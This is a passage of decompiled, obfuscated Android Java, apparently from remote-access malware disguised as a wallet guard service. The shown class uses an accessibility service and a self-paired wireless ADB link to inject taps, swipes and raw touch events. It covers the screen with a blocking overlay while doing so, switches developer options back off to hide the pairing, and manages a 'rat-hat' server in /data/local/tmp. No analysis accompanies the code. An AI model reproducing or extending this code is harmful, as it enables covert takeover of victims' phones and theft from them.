            m303E.m317B(5000L);
            boolean isEmpty = linkedList.isEmpty();
            linkedList3 = m303E.f138i;
            if (!isEmpty) {
                linkedList3.addAll(linkedList);
            }
            atomicInteger = m303E.f140k;
            atomicInteger.set(-1);
            boolean isEmpty2 = linkedList2.isEmpty();
            linkedList4 = m303E.f139j;
            if (!isEmpty2) {
                linkedList4.addAll(linkedList2);
            }
            atomicInteger.set(-1);
        } catch (Exception e2) {
            AbstractC0026q.m186s("AdbConnectionManager", e2);
        }
        do {
            if (linkedList3.isEmpty() && linkedList4.isEmpty()) {
                z2 = false;
                if (!z2) {
                    i2 = atomicInteger.get();
                    if (i2 == 0 || i2 == 1) {
                        break;
                    }
                } else {
                    m303E.close();
                    return 5;
                }
            }
            z2 = true;
            if (!z2) {
            }
        } while (i2 != 5);
        m303E.close();
        return i2;
    }

    /* renamed from: R */
    public final void m859R(boolean z2) {
        boolean z3 = true;
        if (z2) {
            this.f607A.set(true);
        }
        if (C0262b.m737c()) {
            C0262b.m738d();
        }
        AbstractC0184g.m349c();
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService.m554P().m541v();
        }
        if (z2 && this.f613k.tryLock()) {
            if (m855N("/data/local/tmp/rat-hat server --stop")) {
                AbstractC0251g.T0(25);
                m856O("exit");
                if (this.f612j.tryLock()) {
                    try {
                        synchronized (this.f90a) {
                            C0082d c0082d = this.f91b;
                            if (c0082d != null) {
                                c0082d.close();
                                this.f91b = null;
                            } else {
                                z3 = false;
                            }
                        }
                        if (z3) {
                            this.f623u.set(false);
                            AbstractC0252h.m712p();
                        }
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AdbConnectionManager", e2);
                    }
                    this.f612j.unlock();
                }
            }
            this.f613k.unlock();
        }
    }

    /* renamed from: U */
    public final boolean m860U() {
        boolean isPaired;
        boolean isPaired2;
        synchronized (ADBConfig.class) {
            isPaired = AbstractC0252h.m689J().isPaired();
        }
        AtomicBoolean atomicBoolean = this.f625w;
        if (isPaired) {
            synchronized (ADBConfig.class) {
                isPaired2 = AbstractC0252h.m689J().isPaired();
            }
            atomicBoolean.set(isPaired2);
        }
        return atomicBoolean.get();
    }

    /* renamed from: V */
    public final void m861V() {
        if (Build.VERSION.SDK_INT <= 29 || MyAccessibilityService.m554P().m535p() || MyAccessibilityService.m554P().m533n() != null || MyAccessibilityService.m554P().m527h()) {
            return;
        }
        Log.d("AdbConnectionManager", "保持关闭开发者选项");
        if (AbstractC0251g.m638K() && m860U() && AbstractC0251g.m655b() && mo302D()) {
            Log.d("AdbConnectionManager", "无线调试已配对、无线调试已连接 关闭开发者选项");
            AbstractC0207l.m422e();
        }
    }

    /* renamed from: W */
    public final boolean m862W(LinkedList linkedList) {
        String format;
        if (!linkedList.isEmpty() && mo302D()) {
            LinkedList linkedList2 = new LinkedList();
            for (int i2 = 0; i2 < linkedList.size(); i2++) {
                Point point = (Point) linkedList.get(i2);
                Locale locale = Locale.getDefault();
                if (i2 == 0) {
                    format = String.format(locale, "input motionevent DOWN %.0f %.0f", Float.valueOf(point.getX()), Float.valueOf(point.getY()));
                } else {
                    linkedList2.add(String.format(locale, "input motionevent MOVE %.0f %.0f", Float.valueOf(point.getX()), Float.valueOf(point.getY())));
                    if (i2 == linkedList.size() - 1) {
                        format = String.format(Locale.getDefault(), "input motionevent UP %.0f %.0f", Float.valueOf(point.getX()), Float.valueOf(point.getY()));
                    }
                }
                linkedList2.add(format);
            }
            if (!linkedList2.isEmpty()) {
                return m855N(TextUtils.join(" && ", linkedList2));
            }
        }
        return false;
    }

    /* renamed from: X */
    public final boolean m863X() {
        boolean m701e;
        if (MyAccessibilityService.m554P() == null) {
            if (!MyAccessibilityService.f322r.get() && !AbstractC0251g.m639L()) {
                AbstractC0246b.m600e();
            }
            return false;
        }
        if (AbstractC0251g.m655b()) {
            return false;
        }
        synchronized (AbstractC0252h.class) {
            m701e = AbstractC0252h.m701e("adbCanWriteSecure");
        }
        if (m701e || this.f607A.get() || MyAccessibilityService.m554P().m529j() || AbstractC0956a.m1443a()) {
            return false;
        }
        Log.d("AdbConnectionManager", "openWriteSecure openWriteSecure ");
        boolean z2 = AbstractC0252h.m710n() || AbstractC0252h.m711o();
        if (!AbstractC0252h.m711o()) {
            AbstractC0207l.m420c();
        }
        if (!AbstractC0251g.m638K()) {
            m847Z();
        }
        if (!AbstractC0251g.m638K()) {
            return false;
        }
        if (AbstractC0251g.p0() && AbstractC0251g.r0() && !z2) {
            return false;
        }
        BlockViewVO blockViewVO = new BlockViewVO(false, null, true, true);
        if (AbstractC0249e.m621j()) {
            MyAccessibilityService.m554P().getClass();
            blockViewVO.setBlockDrawable(MyAccessibilityService.o0());
        }
        AbstractC0184g.m347a(blockViewVO);
        if (!AbstractC0251g.p1(null)) {
            AbstractC0184g.m349c();
            return false;
        }
        if (AbstractC0026q.m156G() && !AbstractC0026q.m150A() && !AbstractC0026q.m164O(null, null)) {
            AbstractC0184g.m349c();
            return false;
        }
        if (C0262b.f433a != null && AbstractC0249e.m623l()) {
            C0262b.m739e();
        }
        AbstractC0207l.m437t("ENABLE_SECURE_RUNNING_EVENT");
        MyAccessibilityService m554P = MyAccessibilityService.m554P();
        m554P.getClass();
        try {
            if (m554P.m527h()) {
                m554P.m541v();
            }
            m554P.f303a.add(new C0422k());
            m554P.m539t(C0422k.class.getName(), C0422k.m1125J());
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
        AbstractC0251g.T0(10);
        AbstractC0251g.f1();
        return true;
    }

    public final boolean b0(List list) {
        if (!list.isEmpty() && mo302D()) {
            LinkedList linkedList = new LinkedList();
            for (int i2 = 0; i2 < list.size(); i2++) {
                TouchEvent touchEvent = (TouchEvent) list.get(i2);
                linkedList.add(!AbstractC0026q.m151B(touchEvent.getValue()) ? String.format(Locale.getDefault(), "sendevent %s %s %s %s", touchEvent.getDeviceName(), touchEvent.getTypeName(), touchEvent.getCodeName(), touchEvent.getValue()) : String.format(Locale.getDefault(), "sendevent %s %s %s", touchEvent.getDeviceName(), touchEvent.getTypeName(), touchEvent.getCodeName()));
            }
            if (!linkedList.isEmpty()) {
                return m855N(TextUtils.join(" && ", linkedList));
            }
        }
        return false;
    }

    public final boolean c0(List list) {
        if (list == null || list.isEmpty() || !mo302D()) {
            return false;
        }
        Iterator it = list.iterator();
        int i2 = 0;
        int i3 = 0;
        while (it.hasNext()) {
            Point point = (Point) it.next();
            if (point != null && point.getX() >= 0.0f && point.getY() >= 0.0f) {
                try {
                    Thread.sleep(400L);
                } catch (Exception e2) {
                    AbstractC0026q.m186s("AdbConnectionManager", e2);
                }
                i3++;
                if (m855N(String.format(Locale.getDefault(), "input tap %.0f %.0f", Float.valueOf(point.getX()), Float.valueOf(point.getY())))) {
                    i2++;
                }
            }
        }
        return i2 == i3;
    }

    @Override // b1.AbstractC0080b, java.io.Closeable, java.lang.AutoCloseable
    public final void close() {
        this.f617o.shutdownNow();
        this.f618p.shutdownNow();
        this.f620r.clear();
        this.f619q.shutdownNow();
        super.close();
    }
}
